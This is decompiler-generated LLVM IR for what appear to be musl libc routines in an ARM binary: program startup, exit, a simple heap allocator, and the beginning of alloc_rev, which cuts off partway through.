define i32 @__libc_start_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp41 = call i32 @__decompiler_undefined_function_0()
  %tmp42 = call i32 @__decompiler_undefined_function_0()
  %tmp43 = call i32 @__decompiler_undefined_function_0()
  %tmp44 = call i32 @__decompiler_undefined_function_0()
  %tmp45 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %tmp55 = call i32 @__decompiler_undefined_function_0()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %v4_ab20 = mul i32 %arg2, 4
  %v5_ab20 = add i32 %v4_ab20, 4
  %v1_ab24 = add i32 %v5_ab20, %tmp
  store i32 %v1_ab24, i32* @r5, align 4
  %v2_ab2c = load i32, i32* %arg3, align 4
  store i32 %v2_ab2c, i32* @r7, align 4
  store i32 %v1_ab24, i32* @global_var_23d34.409, align 4
  %v2_ab34 = ptrtoint i32* %stack_var_-208 to i32
  store i32 %tmp, i32* @r6, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg1, i32* @sl, align 4
  br label %dec_label_pc_ab48

dec_label_pc_ab48:                                ; preds = %dec_label_pc_ab48, %entry
  %v0_ab48 = phi i32 [ %v4_ab4c, %dec_label_pc_ab48 ], [ %v1_ab24, %entry ]
  store i32 %v0_ab48, i32* @r4, align 4
  %v1_ab4c = inttoptr i32 %v0_ab48 to i32*
  %v2_ab4c = load i32, i32* %v1_ab4c, align 4
  store i32 %v2_ab4c, i32* @r1, align 4
  %v4_ab4c = add i32 %v0_ab48, 4
  %v2_ab50 = icmp eq i32 %v2_ab4c, 0
  br i1 %v2_ab50, label %dec_label_pc_ab58, label %dec_label_pc_ab48

dec_label_pc_ab58:                                ; preds = %dec_label_pc_ab48
  store i32 152, i32* @r2, align 4
  store i32 %v2_ab34, i32* @r0, align 4
  %v0_ab60 = call i32 @memset()
  store i32 %v0_ab60, i32* %r0.global-to-local, align 4
  %v0_ab68 = load i32, i32* @r4, align 4
  %v1_ab68 = add i32 %v0_ab68, 4
  store i32 %v1_ab68, i32* %r2.global-to-local, align 4
  store i32 %v0_ab68, i32* %r1.global-to-local, align 4
  store i32 %v1_ab68, i32* @global_var_23e98.412, align 4
  %v2_ab9019 = inttoptr i32 %v1_ab68 to i32*
  %v3_ab9020 = load i32, i32* %v2_ab9019, align 4
  %v2_ab9422 = icmp eq i32 %v3_ab9020, 0
  br i1 %v2_ab9422, label %dec_label_pc_ab9c, label %dec_label_pc_ab78.lr.ph

dec_label_pc_ab78.lr.ph:                          ; preds = %dec_label_pc_ab58
  %v6_ab80 = ptrtoint i32* %stack_var_-32 to i32
  br label %dec_label_pc_ab78

dec_label_pc_ab78:                                ; preds = %dec_label_pc_ab78.lr.ph, %dec_label_pc_ab90
  %v4_ab7c = phi i32 [ %v0_ab68, %dec_label_pc_ab78.lr.ph ], [ %v1_ab8c, %dec_label_pc_ab90 ]
  %v5_ab84 = phi i32 [ %v3_ab9020, %dec_label_pc_ab78.lr.ph ], [ %v3_ab90, %dec_label_pc_ab90 ]
  %v2_ab78 = icmp ugt i32 %v5_ab84, 36
  %v7_ab78 = icmp eq i32 %v5_ab84, 37
  %v2_ab7c = xor i1 %v2_ab78, true
  %v3_ab7c = or i1 %v7_ab78, %v2_ab7c
  br i1 %v3_ab7c, label %bb, label %.thread38

bb:                                               ; preds = %dec_label_pc_ab78
  %v5_ab7c = add i32 %v4_ab7c, 8
  %v6_ab7c = inttoptr i32 %v5_ab7c to i32*
  %v7_ab7c = load i32, i32* %v6_ab7c, align 4
  store i32 %v7_ab7c, i32* %r2.global-to-local, align 4
  store i32 %v6_ab80, i32* %r0.global-to-local, align 4
  %v6_ab84 = and i32 %v5_ab84, 1073741824
  %v7_ab84 = icmp ne i32 %v6_ab84, 0
  %v8_ab84 = mul i32 %v5_ab84, 4
  %v9_ab84 = add i32 %v8_ab84, %v6_ab80
  br label %.thread38

.thread38:                                        ; preds = %dec_label_pc_ab78, %bb
  %v5_ab88 = phi i32 [ %v9_ab84, %bb ], [ %v5_ab84, %dec_label_pc_ab78 ]
  %v1_ab8823 = phi i1 [ %v7_ab84, %bb ], [ %v2_ab78, %dec_label_pc_ab78 ]
  %v2_ab88 = xor i1 %v1_ab8823, true
  %v3_ab88 = or i1 %v7_ab78, %v2_ab88
  br i1 %v3_ab88, label %bb60, label %dec_label_pc_ab90

bb60:                                             ; preds = %.thread38
  %v4_ab88 = load i32, i32* %r2.global-to-local, align 4
  %v6_ab88 = add i32 %v5_ab88, -176
  %v7_ab88 = inttoptr i32 %v6_ab88 to i32*
  store i32 %v4_ab88, i32* %v7_ab88, align 4
  %v0_ab8c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_ab90

dec_label_pc_ab90:                                ; preds = %.thread38, %bb60
  %v0_ab8c = phi i32 [ %v4_ab7c, %.thread38 ], [ %v0_ab8c.pre, %bb60 ]
  %v1_ab8c = add i32 %v0_ab8c, 8
  store i32 %v1_ab8c, i32* %r1.global-to-local, align 4
  %v1_ab90 = add i32 %v0_ab8c, 12
  %v2_ab90 = inttoptr i32 %v1_ab90 to i32*
  %v3_ab90 = load i32, i32* %v2_ab90, align 4
  %v2_ab94 = icmp eq i32 %v3_ab90, 0
  br i1 %v2_ab94, label %dec_label_pc_ab90.dec_label_pc_ab9c_crit_edge, label %dec_label_pc_ab78

dec_label_pc_ab90.dec_label_pc_ab9c_crit_edge:    ; preds = %dec_label_pc_ab90
  br label %dec_label_pc_ab9c

dec_label_pc_ab9c:                                ; preds = %dec_label_pc_ab90.dec_label_pc_ab9c_crit_edge, %dec_label_pc_ab58
  store i32 %tmp45, i32* %r2.global-to-local, align 4
  %v0_abbc = load i32, i32* @r7, align 4
  %v2_abbc = icmp eq i32 %v0_abbc, 0
  store i32 %tmp45, i32* @global_var_23ea0.417, align 4
  br i1 %v2_abbc, label %dec_label_pc_ac00, label %dec_label_pc_abc8

dec_label_pc_abc8:                                ; preds = %dec_label_pc_ab9c
  store i32 ptrtoint (i32* @global_var_238c4.419 to i32), i32* %r2.global-to-local, align 4
  store i32 %v0_abbc, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_238c4.419 to i32), i32* %r0.global-to-local, align 4
  store i32 %v0_abbc, i32* @global_var_238c8.421, align 4
  store i32 %v0_abbc, i32* @global_var_238c4.419, align 4
  %v1_abf413 = inttoptr i32 %v0_abbc to i8*
  %v2_abf414 = load i8, i8* %v1_abf413, align 1
  %v2_abf816 = icmp eq i8 %v2_abf414, 0
  br i1 %v2_abf816, label %dec_label_pc_ac00, label %dec_label_pc_abe4

dec_label_pc_abe4:                                ; preds = %dec_label_pc_abc8, %.thread
  %v1_abe8 = phi i32 [ %v1_abf0, %.thread ], [ %v0_abbc, %dec_label_pc_abc8 ]
  %v0_abe4.in = phi i8 [ %v2_abf4, %.thread ], [ %v2_abf414, %dec_label_pc_abc8 ]
  %v7_abe4 = icmp eq i8 %v0_abe4.in, 47
  br i1 %v7_abe4, label %bb61, label %.thread

bb61:                                             ; preds = %dec_label_pc_abe4
  %v2_abe8 = add i32 %v1_abe8, 1
  %v2_abec = load i32, i32* %r0.global-to-local, align 4
  %v3_abec = inttoptr i32 %v2_abec to i32*
  store i32 %v2_abe8, i32* %v3_abec, align 4
  %v0_abf0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_abe4, %bb61
  %v0_abf0 = phi i32 [ %v1_abe8, %dec_label_pc_abe4 ], [ %v0_abf0.pre, %bb61 ]
  %v1_abf0 = add i32 %v0_abf0, 1
  store i32 %v1_abf0, i32* %r1.global-to-local, align 4
  %v1_abf4 = inttoptr i32 %v1_abf0 to i8*
  %v2_abf4 = load i8, i8* %v1_abf4, align 1
  %v2_abf8 = icmp eq i8 %v2_abf4, 0
  br i1 %v2_abf8, label %dec_label_pc_ac00, label %dec_label_pc_abe4

dec_label_pc_ac00:                                ; preds = %.thread, %dec_label_pc_abc8, %dec_label_pc_ab9c
  store i32 %v2_ab34, i32* %r0.global-to-local, align 4
  %v1_ac04 = call i32 @__init_tls(i32 %v2_ab34)
  store i32 %tmp44, i32* @r0, align 4
  %v2_ac14 = call i32 @dummy1(i32 %tmp44)
  store i32 %v2_ac14, i32* @r0, align 4
  store i32 %tmp56, i32* %r2.global-to-local, align 4
  %v9_ac20 = icmp eq i32 %tmp56, %tmp43
  br i1 %v9_ac20, label %dec_label_pc_ac28, label %dec_label_pc_ac44

dec_label_pc_ac28:                                ; preds = %dec_label_pc_ac00
  store i32 %tmp55, i32* %r2.global-to-local, align 4
  %v9_ac30 = icmp eq i32 %tmp55, %tmp42
  br i1 %v9_ac30, label %dec_label_pc_ac38, label %dec_label_pc_ac44

dec_label_pc_ac38:                                ; preds = %dec_label_pc_ac28
  %v2_ac3c = icmp eq i32 %tmp41, 0
  br i1 %v2_ac3c, label %dec_label_pc_acc0, label %dec_label_pc_ac44

dec_label_pc_ac44:                                ; preds = %dec_label_pc_ac28, %dec_label_pc_ac00, %dec_label_pc_ac38
  %v2_ac44 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_ac44, i32* @r4, align 4
  store i32 %v2_ac44, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_ac54 = call i32 @memset()
  store i32 %v2_ac44, i32* @r0, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_ac80

dec_label_pc_ac80:                                ; preds = %bb63, %dec_label_pc_ac44
  %v1_ac80 = phi i32 [ %v1_aca8, %bb63 ], [ 0, %dec_label_pc_ac44 ]
  %v0_ac80 = load i32, i32* @r4, align 4
  %v2_ac80 = add i32 %v0_ac80, %v1_ac80
  %v1_ac84 = add i32 %v2_ac80, 6
  %v2_ac84 = inttoptr i32 %v1_ac84 to i16*
  %v3_ac84 = load i16, i16* %v2_ac84, align 2
  %v1_ac88 = and i16 %v3_ac84, 32
  %v2_ac88 = icmp eq i16 %v1_ac88, 0
  br i1 %v2_ac88, label %bb63, label %dec_label_pc_ac90

dec_label_pc_ac90:                                ; preds = %dec_label_pc_ac80
  store i32 ptrtoint ([10 x i8]* @global_var_19c3c.424 to i32), i32* @r0, align 4
  store i32 131074, i32* %r1.global-to-local, align 4
  br i1 icmp slt ([10 x i8]* @global_var_19c3c.424, [10 x i8]* null), label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_ac90
  %v3_aca4 = load i32, i32* @ip, align 4
  %v4_aca4 = trunc i32 %v3_aca4 to i8
  %v6_aca4 = inttoptr i32 %v3_aca4 to i8*
  store i8 %v4_aca4, i8* %v6_aca4, align 1
  %v0_aca8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb63

bb63:                                             ; preds = %dec_label_pc_ac80, %dec_label_pc_ac90, %bb62
  %v0_aca8 = phi i32 [ %v1_ac80, %dec_label_pc_ac80 ], [ %v1_ac80, %dec_label_pc_ac90 ], [ %v0_aca8.pre, %bb62 ]
  %v1_aca8 = add i32 %v0_aca8, 8
  store i32 %v1_aca8, i32* %r2.global-to-local, align 4
  %v7_acac = icmp eq i32 %v1_aca8, 24
  br i1 %v7_acac, label %dec_label_pc_acb4, label %dec_label_pc_ac80

dec_label_pc_acb4:                                ; preds = %bb63
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* @global_var_23e90.426, align 4
  br label %dec_label_pc_acc0

dec_label_pc_acc0:                                ; preds = %dec_label_pc_ac38, %dec_label_pc_acb4
  store i32 44236, i32* @lr, align 4
  %v1_acc8 = call i32 @_init()
  store i32 %v1_acc8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23008.431 to i32), i32* @r7, align 4
  br i1 icmp uge (i32* @global_var_23004.429, i32* @global_var_23008.431), label %dec_label_pc_acec, label %dec_label_pc_acd8

dec_label_pc_acd8:                                ; preds = %dec_label_pc_acd8, %dec_label_pc_acc0
  %v0_acd8 = phi i32 [ %v4_acd8, %dec_label_pc_acd8 ], [ ptrtoint (i32* @global_var_23004.429 to i32), %dec_label_pc_acc0 ]
  %v1_acd8 = inttoptr i32 %v0_acd8 to i32*
  %v2_acd8 = load i32, i32* %v1_acd8, align 4
  %v4_acd8 = add i32 %v0_acd8, 4
  call void @__pseudo_branch(i32 %v2_acd8)
  %v1_ace4 = load i32, i32* @r7, align 4
  %v3_ace4 = icmp ult i32 %v4_acd8, %v1_ace4
  br i1 %v3_ace4, label %dec_label_pc_acd8, label %dec_label_pc_acec

dec_label_pc_acec:                                ; preds = %dec_label_pc_acd8, %dec_label_pc_acc0
  %v0_acec = load i32, i32* @r6, align 4
  store i32 %v0_acec, i32* %r1.global-to-local, align 4
  %v0_acf4 = load i32, i32* @r8, align 4
  store i32 %v0_acf4, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_ad00 = call i32 @exit(i32 %v0_acf4)
  store i32 %v1_ad00, i32* %r0.global-to-local, align 4
  ret i32 %v1_ad00

; uselistorder directives
  uselistorder i32 %v0_acd8, { 1, 0 }
  uselistorder i32 %v1_aca8, { 1, 2, 0 }
  uselistorder i32 %v1_ac80, { 1, 2, 0 }
  uselistorder i8 %v2_abf4, { 1, 0 }
  uselistorder i32 %v1_abf0, { 1, 2, 0 }
  uselistorder i32 %v0_abbc, { 0, 4, 3, 2, 1, 5 }
  uselistorder i32 %v3_ab90, { 1, 0 }
  uselistorder i32 %v1_ab8c, { 1, 0 }
  uselistorder i32 %v0_ab8c, { 1, 0 }
  uselistorder i1 %v2_ab78, { 1, 0 }
  uselistorder i32 %v5_ab84, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_ab48, { 2, 1, 0 }
  uselistorder i32 %v2_ab34, { 1, 0, 2 }
  uselistorder i32 %tmp56, { 1, 0 }
  uselistorder i32 %tmp55, { 1, 0 }
  uselistorder i32 %tmp44, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 11, 9, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 1, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* @global_var_23004.429, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_acc0, { 1, 0 }
  uselistorder label %bb63, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ac44, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_abe4, { 1, 0 }
  uselistorder label %dec_label_pc_ab90, { 1, 0 }
  uselistorder label %.thread38, { 1, 0 }
  uselistorder label %dec_label_pc_ab78, { 1, 0 }
}

define i32 @__errno_location() local_unnamed_addr {
entry:
  %v0_ad38 = call i32 @__aeabi_read_tp()
  %v1_ad3c = add i32 %v0_ad38, -164
  ret i32 %v1_ad3c
}

define i32 @_dummy() local_unnamed_addr {
entry:
  %v1_ad48 = load i32, i32* @r0, align 4
  ret i32 %v1_ad48
}

define i32 @exit(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg1, i32* @r6, align 4
  %v1_ad58 = call i32 @_dummy()
  store i32 %v1_ad58, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_2300c.30 to i32), i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_23008.431 to i32), i32* @r5, align 4
  br i1 icmp uge (i32* @global_var_2300c.30, i32* @global_var_23008.431), label %dec_label_pc_ad68, label %dec_label_pc_ad7c

dec_label_pc_ad68:                                ; preds = %entry, %dec_label_pc_ad68
  %v0_ad683 = phi i32 [ %v0_ad74.pre, %dec_label_pc_ad68 ], [ ptrtoint (i32* @global_var_2300c.30 to i32), %entry ]
  %v1_ad68 = add i32 %v0_ad683, -4
  %v2_ad68 = inttoptr i32 %v1_ad68 to i32*
  %v3_ad68 = load i32, i32* %v2_ad68, align 4
  store i32 %v1_ad68, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_ad68)
  %v0_ad74.pre = load i32, i32* @r4, align 4
  %v1_ad74.pre = load i32, i32* @r5, align 4
  %tmp = icmp ugt i32 %v0_ad74.pre, %v1_ad74.pre
  br i1 %tmp, label %dec_label_pc_ad68, label %dec_label_pc_ad7c

dec_label_pc_ad7c:                                ; preds = %dec_label_pc_ad68, %entry
  store i32 44424, i32* @lr, align 4
  %v1_ad84 = call i32 @_fini()
  store i32 44436, i32* @lr, align 4
  %v1_ad90 = call i32 @__stdio_exit()
  %v0_ad94 = load i32, i32* @r6, align 4
  %v1_ad98 = call i32 @_Exit(i32 %v0_ad94)
  ret i32 %v1_ad98

; uselistorder directives
  uselistorder i32* @global_var_2300c.30, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_2300c.30 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_ad68, { 1, 0 }
}

define i32 @__simple_malloc(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v6_adb0 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_adb4 = icmp eq i32 %arg1, 0
  br i1 %v2_adb4, label %dec_label_pc_ae8c, label %dec_label_pc_adc0

dec_label_pc_adc0:                                ; preds = %entry
  %v7_adc0 = icmp eq i32 %arg1, 1
  br i1 %v7_adc0, label %dec_label_pc_adf4, label %dec_label_pc_adcc

dec_label_pc_adcc:                                ; preds = %dec_label_pc_adc0
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_add0

dec_label_pc_add0:                                ; preds = %bb42, %dec_label_pc_adcc
  %v0_ade09 = phi i32 [ %v2_add0, %bb42 ], [ 1, %dec_label_pc_adcc ]
  %v2_add0 = mul i32 %v0_ade09, 2
  %v3_add4 = icmp ule i32 %v2_add0, %arg1
  %v9_add4 = icmp eq i32 %v2_add0, %arg1
  %v2_add8 = xor i1 %v3_add4, true
  %v3_add8 = or i1 %v9_add4, %v2_add8
  br i1 %v3_add8, label %bb, label %bb39

bb:                                               ; preds = %dec_label_pc_add0
  store i32 0, i32* @r3, align 4
  br label %bb39

bb39:                                             ; preds = %dec_label_pc_add0, %bb
  %v2_addc = xor i1 %v9_add4, true
  %v3_addc = and i1 %v3_add4, %v2_addc
  br i1 %v3_addc, label %bb40, label %bb41

bb40:                                             ; preds = %bb39
  store i32 1, i32* @r3, align 4
  br label %bb41

bb41:                                             ; preds = %bb39, %bb40
  %v2_ade0 = icmp ugt i32 %v2_add0, 14
  br i1 %v2_ade0, label %.thread, label %bb42

.thread:                                          ; preds = %bb41
  store i32 %v2_add0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_adf0

bb42:                                             ; preds = %bb41
  %v0_ade8.pr = load i32, i32* @r3, align 4
  %v2_ade8 = icmp eq i32 %v0_ade8.pr, 0
  br i1 %v2_ade8, label %dec_label_pc_adf0.loopexit, label %dec_label_pc_add0

dec_label_pc_adf0.loopexit:                       ; preds = %bb42
  store i32 %v2_add0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_adf0

dec_label_pc_adf0:                                ; preds = %dec_label_pc_adf0.loopexit, %.thread
  %v1_adf0 = add i32 %v2_add0, -1
  br label %dec_label_pc_adf4

dec_label_pc_adf4:                                ; preds = %dec_label_pc_adc0, %dec_label_pc_adf0
  %storemerge = phi i32 [ %v1_adf0, %dec_label_pc_adf0 ], [ 0, %dec_label_pc_adc0 ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_238d8.439 to i32), i32* @r8, align 4
  %v2_adfc = call i32 @__lock(i32* nonnull @global_var_238cc.441)
  %v2_ae00 = load i32, i32* @global_var_238d8.439, align 4
  store i32 %v2_ae00, i32* %r2.global-to-local, align 4
  %v0_ae04 = load i32, i32* @r4, align 4
  %v1_ae08 = sub i32 0, %v2_ae00
  store i32 %v1_ae08, i32* %r3.global-to-local, align 4
  %v0_ae0c = load i32, i32* @r5, align 4
  %v2_ae0c = and i32 %v0_ae0c, %v1_ae08
  store i32 %v2_ae0c, i32* @r6, align 4
  %tmp = icmp ult i32 %v0_ae04, -2147483632
  br i1 %tmp, label %dec_label_pc_aea4, label %dec_label_pc_ae14

dec_label_pc_ae14:                                ; preds = %dec_label_pc_adf4, %dec_label_pc_aea4
  %v4_ae24 = phi i32 [ %v2_ae0c, %dec_label_pc_adf4 ], [ %v1_aea4, %dec_label_pc_aea4 ]
  %v0_ae30 = phi i32 [ %v0_ae04, %dec_label_pc_adf4 ], [ %v2_aea4, %dec_label_pc_aea4 ]
  %v0_ae1c = phi i32 [ %v2_ae00, %dec_label_pc_adf4 ], [ %v0_ae1c17, %dec_label_pc_aea4 ]
  store i32 ptrtoint (i32* @global_var_238d4.443 to i32), i32* @r7, align 4
  %v2_ae18 = load i32, i32* @global_var_238d4.443, align 4
  %v2_ae1c = sub i32 %v2_ae18, %v0_ae1c
  store i32 %v2_ae1c, i32* %r3.global-to-local, align 4
  %tmp48 = icmp ugt i32 %v0_ae30, %v2_ae1c
  br i1 %tmp48, label %dec_label_pc_ae2c, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_ae14
  store i32 %v4_ae24, i32* @r1, align 4
  br label %.thread4

dec_label_pc_ae2c:                                ; preds = %dec_label_pc_ae14
  store i32 %v0_ae30, i32* %stack_var_-28, align 4
  %v2_ae34 = call i32 @__expand_heap(i32* nonnull %stack_var_-28)
  store i32 %v2_ae34, i32* %r5.global-to-local, align 4
  %v2_ae38 = icmp eq i32 %v2_ae34, 0
  br i1 %v2_ae38, label %dec_label_pc_aeac, label %dec_label_pc_ae40

dec_label_pc_ae40:                                ; preds = %dec_label_pc_ae2c
  %v2_ae40 = load i32, i32* @global_var_238d4.443, align 4
  %v9_ae44 = icmp eq i32 %v2_ae34, %v2_ae40
  %v3_ae48 = load i32, i32* %stack_var_-28, align 4
  %v2_ae4c = add i32 %v3_ae48, %v2_ae34
  store i32 %v2_ae4c, i32* %r3.global-to-local, align 4
  br i1 %v9_ae44, label %..thread4_crit_edge, label %bb43

..thread4_crit_edge:                              ; preds = %dec_label_pc_ae40
  %v1_ae5429 = load i32, i32* @r7, align 4
  %v2_ae5430 = inttoptr i32 %v1_ae5429 to i32*
  store i32 %v2_ae4c, i32* %v2_ae5430, align 4
  %v1_ae58 = load i32, i32* @r6, align 4
  store i32 %v1_ae58, i32* @r1, align 4
  %v1_ae6c.pre = load i32, i32* @r4, align 4
  br label %.thread4

bb43:                                             ; preds = %dec_label_pc_ae40
  %v2_ae50 = load i32, i32* @r8, align 4
  %v3_ae50 = inttoptr i32 %v2_ae50 to i32*
  store i32 %v2_ae34, i32* %v3_ae50, align 4
  %v0_ae54.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_ae54 = load i32, i32* @r7, align 4
  %v2_ae54 = inttoptr i32 %v1_ae54 to i32*
  store i32 %v0_ae54.pre, i32* %v2_ae54, align 4
  %v1_ae5c = load i32, i32* @r6, align 4
  %v2_ae5c = load i32, i32* @r4, align 4
  %v3_ae5c = sub i32 %v2_ae5c, %v1_ae5c
  store i32 0, i32* @r1, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread26, %..thread4_crit_edge, %bb43
  %v1_ae6c = phi i32 [ %v1_ae6c.pre, %..thread4_crit_edge ], [ %v3_ae5c, %bb43 ], [ %v0_ae30, %.thread26 ]
  %v0_ae64 = load i32, i32* @r8, align 4
  %v1_ae64 = inttoptr i32 %v0_ae64 to i32*
  %v2_ae64 = load i32, i32* %v1_ae64, align 4
  store i32 %v2_ae64, i32* %r2.global-to-local, align 4
  %v2_ae6c = add i32 %v2_ae64, %v1_ae6c
  store i32 %v2_ae6c, i32* %r3.global-to-local, align 4
  store i32 %v2_ae6c, i32* %v1_ae64, align 4
  %v0_ae74 = load i32, i32* %r2.global-to-local, align 4
  %v1_ae74 = load i32, i32* @r1, align 4
  %v2_ae74 = add i32 %v1_ae74, %v0_ae74
  store i32 %v2_ae74, i32* @r4, align 4
  %v2_ae78 = call i32 @__unlock(i32* nonnull @global_var_238cc.441)
  %v0_ae7c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ae7c

dec_label_pc_ae7c:                                ; preds = %dec_label_pc_aeac, %.thread4
  %v0_ae7c = phi i32 [ %v0_aeb4, %dec_label_pc_aeac ], [ %v0_ae7c.pre, %.thread4 ]
  store i32 %v6_adb0, i32* %r5.global-to-local, align 4
  ret i32 %v0_ae7c

dec_label_pc_ae8c:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_238d8.439 to i32), i32* @r8, align 4
  %v2_ae94 = call i32 @__lock(i32* nonnull @global_var_238cc.441)
  %v2_ae98 = load i32, i32* @global_var_238d8.439, align 4
  store i32 %v2_ae98, i32* %r2.global-to-local, align 4
  %v0_ae9c = load i32, i32* @r4, align 4
  store i32 %v0_ae9c, i32* @r6, align 4
  br label %dec_label_pc_aea4

dec_label_pc_aea4:                                ; preds = %dec_label_pc_adf4, %dec_label_pc_ae8c
  %v0_ae1c17 = phi i32 [ %v2_ae00, %dec_label_pc_adf4 ], [ %v2_ae98, %dec_label_pc_ae8c ]
  %v1_aea4 = phi i32 [ %v2_ae0c, %dec_label_pc_adf4 ], [ %v0_ae9c, %dec_label_pc_ae8c ]
  %v0_aea4 = phi i32 [ %v0_ae04, %dec_label_pc_adf4 ], [ 1, %dec_label_pc_ae8c ]
  %v2_aea4 = add i32 %v0_aea4, %v1_aea4
  store i32 %v2_aea4, i32* @r4, align 4
  br label %dec_label_pc_ae14

dec_label_pc_aeac:                                ; preds = %dec_label_pc_ae2c
  %v2_aeb0 = call i32 @__unlock(i32* nonnull @global_var_238cc.441)
  %v0_aeb4 = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_ae7c

; uselistorder directives
  uselistorder i32 %v2_aea4, { 1, 0 }
  uselistorder i32 %v2_ae34, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_ae30, { 1, 2, 0 }
  uselistorder i32 %v2_ae0c, { 1, 0, 2 }
  uselistorder i32 %v0_ae04, { 2, 1, 0 }
  uselistorder i32 %v2_ae00, { 1, 0, 2, 3 }
  uselistorder i1 %v3_add4, { 1, 0 }
  uselistorder i32 %v2_add0, { 6, 4, 5, 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-28, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32* @global_var_238cc.441, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_aea4, { 1, 0 }
  uselistorder label %.thread4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ae14, { 1, 0 }
  uselistorder label %dec_label_pc_adf4, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %bb39, { 1, 0 }
}

define i32 @alloc_rev(i32* %arg1) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %v3_aec8 = load i32, i32* @r4, align 4
  store i32 %v3_aec8, i32* %stack_var_-36, align 4
  %v6_aec8 = load i32, i32* @r5, align 4
  %v9_aec8 = load i32, i32* @r6, align 4
  %v12_aec8 = load i32, i32* @r7, align 4
  %v15_aec8 = load i32, i32* @r8, align 4
  %v21_aec8 = load i32, i32* @sl, align 4
  %v2_aecc = load i32, i32* %arg1, align 4
  store i32 %v2_aecc, i32* @sl, align 4
  %v1_aed0 = urem i32 %v2_aecc, 2
  %v2_aed0 = icmp eq i32 %v1_aed0, 0
  store i32 %tmp, i32* %fp.global-to-local, align 4
  br i1 %v2_aed0, label %dec_label_pc_aee0, label %dec_label_pc_afbc

dec_label_pc_aee0:                                ; preds = %entry, %dec_label_pc_afb0
  %v1_af28 = phi i32 [ %v0_afb0, %dec_label_pc_afb0 ], [ %v2_aecc, %entry ]
  %v3_aee0 = udiv i32 %v1_af28, 16
  store i32 %v3_aee0, i32* %r3.global-to-local, align 4
  %v1_aee4 = add nsw i32 %v3_aee0, -1
  %tmp39 = icmp ult i32 %v1_aee4, 33
  br i1 %tmp39, label %.thread, label %dec_label_pc_aef4

.thread:                                          ; preds = %dec_label_pc_aee0
  store i32 %v1_aee4, i32* @r8, align 4
  br label %dec_label_pc_af0c

dec_label_pc_aef4:                                ; preds = %dec_label_pc_aee0
  %tmp40 = icmp ugt i32 %v1_aee4, 7168
  br i1 %tmp40, label %.thread18, label %dec_label_pc_af00

